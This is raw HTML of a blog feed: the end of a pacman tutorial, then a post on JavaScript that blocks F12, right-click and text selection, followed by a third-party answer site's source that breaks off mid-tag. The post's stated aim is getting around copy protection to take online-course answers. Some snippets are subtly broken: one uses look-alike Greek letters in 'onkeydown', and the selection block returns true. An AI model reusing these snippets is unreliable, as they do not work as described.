class="code"><pre><span class="line">$ pacman -U file://path/to/package/package_name-version.pkg.tar.xz</span><br></pre></td></tr></table></figure><p>安装一个<strong>远程</strong>包（不在 <em>pacman</em> 配置的源里面）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -U http://www.example.com/repo/example.pkg.tar.xz</span><br></pre></td></tr></table></figure><p>要禁用 <code>-S</code>, <code>-U</code> 和 <code>-R</code> 动作，可以使用 <code>-p</code> 选项.</p><p><em>pacman</em> 会列出需要安装和删除的软件，并在执行动作前要求需要的权限。</p><h3 id="安装原因"><a href="#安装原因" class="headerlink" title="安装原因"></a>安装原因</h3><p><em>pacman</em>数据库按照软件包被安装的原因，将其分为两类：</p><ul><li><strong>指定安装包</strong>：通过<em>pacman</em><code>-S</code>或者<code>-U</code>指令安装的软件包。</li><li><strong>依赖包</strong>：指定安装包所依赖的软件包，尽管命令中未传入，但仍然会被安装。</li></ul><p>当安装软件包时，可以把安装原因指定设为<strong>依赖</strong>:</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># pacman -S --asdeps package_name</span></span><br></pre></td></tr></table></figure><p>但是当重新安装该软件包时，安装原因将会被设为软件包所默认的。 指定安装的软件包列表可用<code>pacman -Qe</code>, 已安装的依赖包可用<code>pacman -Qd</code>获取。 改变某个已安装软件包的安装原因，可以执行：</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># pacman -D --asdeps package_name</span></span><br></pre></td></tr></table></figure><p>使用<code>--asexplicit</code>改为<strong>指定安装</strong>。</p><h3 id="查询一个包含具体文件的包名"><a href="#查询一个包含具体文件的包名" class="headerlink" title="查询一个包含具体文件的包名"></a>查询一个包含具体文件的包名</h3><p>同步文件数据库:</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># pacman -Fy</span></span><br></pre></td></tr></table></figure><p>查询包含某个文件的包名，比如:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pacman -Fs pacman</span></span><br><span class="line">core/pacman <span class="number">5.0</span>.<span class="number">1</span>-<span class="number">4</span></span><br><span class="line">    usr/bin/pacman</span><br><span class="line">    usr/share/bash-completion/completions/pacman</span><br><span class="line">extra/xscreensaver <span class="number">5.36</span>-<span class="number">1</span></span><br><span class="line">    usr/<span class="class"><span class="keyword">lib</span>/<span class="title">xscreensaver</span>/<span class="title">pacman</span></span></span><br></pre></td></tr></table></figure><p><strong>提示：</strong> 可以设置一个 <code>crontab</code> 或者 <code>systemd timer</code> 来定期同步文件信息数据库。</p><p>如果需要高级功能请安装 <a href="https://wiki.archlinux.org/index.php/Pkgfile" target="_blank" rel="noopener">pkgfile</a>，它使用一个单独的数据库来保存文件和它们所关联的软件包的信息。</p><p>ArchLinux的版本库里面包括：</p><p>　　core-核心软件包<br>　　extra-其他常用软件<br>　　community-社区软件包，譬如Mysql等。<br>　　testing-正在测试阶段，还没有正式加入源的软件包。通常软件版本比较新，但是不是非常稳定<br>　　release-已经发布的软件包<br>　　unstable-非正式的软件包，可能包括以前版本的软件或者测试软件</p><p>　　因为Pacman的软件都是从源里面更新，因此在/etc/pacman.d里面配置这些软件源的地址。在/etc/pacman.d目录里面分别有上面几种软件类型对应的文件名，可以自己手工配置这些软件源的地址。</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> ArchLinux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js_banned</title>
      <link href="/2019/10/09/js-banned/"/>
      <url>/2019/10/09/js-banned/</url>
      
        <content type="html"><![CDATA[<p>序：原本想从网页上搞些网课答案下来，懒得用爬虫，便想直接复制粘贴更方便，结果遭遇了网页的复制和控制台禁用，本着求知的精神，就有了这篇文章。</p><h1 id="网页中部分禁用及破解"><a href="#网页中部分禁用及破解" class="headerlink" title="网页中部分禁用及破解"></a>网页中部分禁用及破解</h1><ul><li><h3 id="利用js实现"><a href="#利用js实现" class="headerlink" title="利用js实现"></a>利用js实现</h3></li></ul><p>禁用F12</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">document</span>.οnkeydοwn=<span class="function"><span class="keyword">function</span> (<span class="params">e</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> currKey=<span class="number">0</span>,evt=e||<span class="built_in">window</span>.event;</span><br><span class="line">        currKey=evt.keyCode||evt.which||evt.charCode;</span><br><span class="line">        <span class="keyword">if</span> (currKey == <span class="number">123</span>) &#123;</span><br><span class="line">            <span class="built_in">window</span>.event.cancelBubble = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">window</span>.event.returnValue = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> h = <span class="built_in">window</span>.innerHeight,w=<span class="built_in">window</span>.innerWidth;</span><br><span class="line"><span class="comment">//禁用右键 （防止右键查看源代码）</span></span><br><span class="line"><span class="built_in">window</span>.oncontextmenu=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&lt;br&gt;   <span class="keyword">return</span> <span class="literal">false</span>;<span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span>&#125;</span></span><br><span class="line"><span class="xml">//在本网页的任何键盘敲击事件都是无效操作 （防止F12和shift+ctrl+i调起开发者工具）</span></span><br><span class="line"><span class="xml">window.onkeydown = window.onkeyup = window.onkeypress = function () &#123;</span></span><br><span class="line"><span class="xml">    window.event.returnValue = false;</span></span><br><span class="line"><span class="xml">    return false;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml">//如果用户在工具栏调起开发者工具，那么判断浏览器的可视高度和可视宽度是否有改变，如有改变则关闭本页面</span></span><br><span class="line"><span class="xml">window.onresize = function () &#123;</span></span><br><span class="line"><span class="xml">    if (h != window.innerHeight||w!=window.innerWidth)&#123;</span></span><br><span class="line"><span class="xml">        window.close();</span></span><br><span class="line"><span class="xml">        window.location = "about:blank";</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">&#125;;</span></span><br><span class="line"><span class="xml">                                </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">(<span class="built_in">document</span>).keydown(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> key(<span class="built_in">arguments</span>[<span class="number">0</span>])</span><br><span class="line">&#125;);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">key</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//f12</span></span><br><span class="line">    <span class="keyword">var</span> keynum;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.event) &#123;</span><br><span class="line">        keynum = e.keyCode;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.which) &#123;</span><br><span class="line">        keynum = e.which;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (keynum == <span class="number">123</span>) &#123;</span><br><span class="line">        <span class="built_in">window</span>.close();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//ctrl+shift</span></span><br><span class="line">    <span class="keyword">if</span> (event.shiftKey&amp;&amp;event.ctrlKey) &#123;</span><br><span class="line">        <span class="built_in">window</span>.close();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Click</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">window</span>.event.returnValue = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.oncontextmenu = Click;<span class="comment">// 右击</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>禁用右键菜单</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">document</span>.oncontextmenu = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>禁用文本选择</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">document</span>.onselectstart = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="literal">true</span>;&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><ul><li>一个网页：当禁用js时无法打开，不禁用js，禁止复制、看源码、右键菜单、F12、文本选择</li></ul><p>适合学习</p><p>原网页：<a href="http://www.gebidemengmianren.com/eryadaanfufei/198.html?btwaf=99961145" target="_blank" rel="noopener">http://www.gebidemengmianren.com/eryadaanfufei/198.html?btwaf=99961145</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Cache-Control"</span> <span class="attr">content</span>=<span class="string">"no-transform"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Cache-Control"</span> <span class="attr">content</span>=<span class="string">"no-siteapp"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"applicable-device"</span> <span class="attr">content</span>=<span class="string">"pc,mobile"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"MobileOptimized"</span> <span class="attr">content</span>=<span class="string">"width"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"HandheldFriendly"</span> <span class="attr">content</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span> <span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"0; url=http://www.gebidemengmianren.com/my-plugins/no-js.html"</span> /&gt;</span><span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">media</span>=<span class="string">"all"</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/wp-content/cache/autoptimize/css/autoptimize_fbc8fb4f52ab77546156f37a7cb23309.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>当代中国政府与政治2019 &amp;#8211; 隔壁的萌面人<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'stylesheet'</span> <span class="attr">id</span>=<span class="string">'dashicons-css'</span> <span class="attr">href</span>=<span class="string">'http://www.gebidemengmianren.com/wp-includes/css/dashicons.min.css?ver=6f0a90e1258fc95d5c87f731d5ec4784'</span> <span class="attr">type</span>=<span class="string">'text/css'</span> <span class="attr">media</span>=<span class="string">'all'</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span> <span class="attr">src</span>=<span class="string">'http://www.gebidemengmianren.com/wp-includes/js/jquery/jquery.js?ver=1.12.4'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span> <span class="attr">src</span>=<span class="string">'http://www.gebidemengmianren.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--[if lt IE 9]&gt; &lt;script type='text/javascript' src='http://www.gebidemengmianren.com/wp-content/themes/wellington/js/html5shiv.min.js?ver=3.7.3'&gt;&lt;/script&gt; &lt;![endif]--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> wellington_menu_title = <span class="string">"\u83dc\u5355"</span>;</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span> <span class="attr">src</span>=<span class="string">'http://www.gebidemengmianren.com/wp-content/themes/wellington/js/navigation.js?ver=20160719'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span 